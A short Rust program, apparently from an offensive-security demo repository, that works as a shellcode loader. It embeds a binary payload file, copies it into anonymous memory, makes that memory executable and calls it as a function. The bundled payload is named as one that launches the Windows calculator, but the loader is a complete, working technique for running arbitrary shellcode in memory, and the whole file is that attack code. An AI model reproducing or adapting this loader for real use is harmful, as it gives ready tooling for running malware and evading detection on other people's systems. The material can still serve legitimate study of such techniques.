use memmap2::MmapOptions;
use std::mem::transmute;

fn main() {
    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
    let shellcode_size = shellcode.len();

    let mut mmap = MmapOptions::new()
        .len(shellcode_size)
        .map_anon()
        .expect("[-]mmap failed!");
    mmap.copy_from_slice(shellcode);
    let mmap = mmap.make_exec().expect("[-]make_exec failed!");

    unsafe {
        let shell: unsafe extern "C" fn() = transmute(mmap.as_ptr());
        shell();
    }
}
